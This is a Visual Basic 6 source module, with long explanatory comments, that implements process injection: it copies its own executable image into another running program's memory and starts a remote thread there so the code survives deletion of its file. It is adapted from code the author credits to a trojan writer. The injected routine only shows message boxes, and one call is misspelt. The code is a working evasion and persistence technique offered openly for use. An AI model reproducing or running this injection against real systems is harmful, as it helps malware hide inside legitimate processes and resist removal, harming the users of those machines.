Attribute VB_Name = "Module1"
' Updated April 21st !!!

' PLEASE READ THESE COMMENTS AS THEY ARE *VERY* IMPORTANT
' Hijacking, or Injection, is a way to execute a piece of code from an executable file into the memory of another program
' This allows us for example to run some code into memory, close our original executable, and then delete it
' This has been done in ASM, Delphi and C++ numerous times, but I've never seen it done in VB.
' I took this change to port similar code in ASM and Delphi from Aphex, a great Trojan Writer, and write his code in VB
' I'll explain the code line-by-line, and have included the ASM and Delphi version of the code as well
' The previous problem was fixed and the code can now perfectly hijack an application..but there is a catch
' The application needs to be a VB6 exe (or maybe vb5, I haven't tried)
' I think this might have to do with the fact a normal EXE won't have the vb6 libraries loaded
' Once again, I invited everyone to take a look at the code and try it out
' Also, please note I did not port this to write a trojan, I think it's a great excercise of programming and has made legitmate uses

' ONE ADDITIONAL THING:
' You will NEED the CompilerControl.dll in order to set the base address of the EXE.
' If you do not do this, the code WILL NOT WORK AT ALL
' Open the CompileController.vbp project, and compile the dll in your VB directory.
' Then, open the InstallCompilecontroller.vbp and execute it.
' Now go in VB's add-in manager, and add the CompileController add-in and make it load on startup.
' Finally, open Inject.vbp. Go to file, hook compilation.
' Now go to file/make exe. Click on options, and select P-code.
' Press ok, and the compiler controller window will appear. You will see /BASE:0x400000. Please replace it with: /BASE:0x13140000
' You don't need the previous switches anymore
' Press finish compilation. I will explain more on this later.
' Now, you just need a vb6.exe. Open vb6, create a new project, and compile it.
' Don't give it any special name or functions, just leave it as it is. This code will look for a program called "project1"
' Now run the EXE you just made, and run the compiled version of this code. It should work.

Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function VirtualAllocEx Lib "kernel32" (ByVal ProcessHandle As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Declare Function VirtualFreeEx Lib "kernel32" (ByVal ProcessHandle As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function CreateRemoteThread Lib "kernel32" (ByVal ProcessHandle As Long, lpThreadAttributes As Long, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
Public Declare Function GetModuleHandleA Lib "kernel32" (ByVal ModName As String) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal ProcessHandle As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nsize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Public Declare Function MessageBox Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
Public Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Public Declare Function CreateEvent Lib "kernel32" Alias "CreateEventA" (ByVal lpEventAttributes As Long, ByVal bManualReset As Long, ByVal bInitialState As Long, ByVal lpname As String) As Long
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hmodule As Integer, ByVal lpFileName As String, ByVal nsize As Integer) As Integer
Public Declare Sub ExitThread Lib "kernel32" (ByVal dwExitCode As Long)
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const MEM_RELEASE = &H8000
Const PAGE_EXECUTE_READWRITE = &H40&
Const IMAGE_NUMBEROF_DIRECTIRY_ENRIES = 16
Const STANDARD_RIGHTS_REQUIRED = &HF0000
Const SYNCHRONIZE = &H100000
Const PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED Or SYNCHRONIZE Or &HFFF)

Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDataStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type

Type IMAGE_OPTIONAL_HEADER32
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitalizedData As Long
    SizeOfUninitalizedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Reserved1 As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    Subsystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaerFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(IMAGE_NUMBEROF_DIRECTIRY_ENRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Type test
    t1 As Long
End Type

Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_onvo As Integer
    e_res(3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(9) As Integer
    e_lfanew As Long
End Type
Const szTarget As String = "project1"
Dim szSharedData As String * 261
Public Sub Main()
' Sub that will start when the program is run
Dim PID As Long, ProcessHandle As Long
Dim Size As Long, BytesWritten As Long, TID As Long, Module As Long, NewModule As Long
Dim PImageOptionalHeader As IMAGE_OPTIONAL_HEADER32, PImageDosHeader As IMAGE_DOS_HEADER, TImageFileHeader As IMAGE_FILE_HEADER, TestType As test

' Get module of our original EXE... don't know how to send it to the thread yet...
GetModuleFileName 0, szSharedData, 261

' Get the PID of notepad.exe. Note that it must be running in memory (open it)
GetWindowThreadProcessId FindWindow(vbNullString, szTarget), PID

' Open the process and give us full access, we need this to hijack it
ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, PID)

' Get the memory location of where our code starts in memory, this will correspond to the /BASE: switch that you put in the linker options using compile controller
Module = GetModuleHandleA(vbNullString)

' Load the code's header into the DosHeader Type
CopyMemory PImageDosHeader, ByVal Module, Len(PImageDosHeader)

' e_lfanew is the starting address of the PE Header in memory. Add this value to the length of the fileheader as well as to the length of the optional header
' These headers are the founding blocks of any executable file, wether in memory or on disk.
CopyMemory PImageOptionalHeader, ByVal (Module + PImageDosHeader.e_lfanew + 4 + Len(TImageFileHeader)), Len(PImageOptionalHeader)

' After adding all those lengths, we will get the final size of the executable in memory, this is usually a bit more then the size on disk
Size = PImageOptionalHeader.SizeOfImage

' Just to make sure, free the memory in notepad.exe at the location of our exe
VirtualFreeEx ProcessHandle, Module, 0, MEM_RELEASE

' Allocate the size of our exe in memory of notepad.exe, at the location of where our exe is in memory
NewModule = VirtualAllocEx(ProcessHandle, Module, Size, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)

' Copy our exe into notepad.exe's memory
WriteProcessMemory ProcessHandle, ByVal NewModule, ByVal Module, Size, BytesWritten

' Create our remote thread
CreateRemoteThread ProcessHandle, ByVal 0, 0, ByVal GetAdd(AddressOf HijackModule), ByVal Module, 0, TID

' Report back what worked and what didn't
MsgBox "Handle of the process is: " & ProcessHandle & vbCrLf & "Callback of HijackModule is: " & GetAdd(AddressOf HijackModule) & vbCrLf & "Handle of module is: " & Module & vbCrLf & "Size of module is: " & Size & vbCrLf & "Memory was allocated at: " & NewModule & vbCrLf & "Thread created with handle: " & TID
End Sub
Private Function GetAdd(Entrypoint As Long) As Long
GetAdd = Entrypoint
End Function
Public Function HijackModule(Stuff As Long) As Long
MessageBox 0, "I am inside a hijacked application", "Hello!", 0
MessageBox 0, "Close the ""Inject"" message box and then delete me", "Hello!", 0
fMessageBox 0, "You see? I am still running even if you deleted me.", "Hello!", 0
End Function
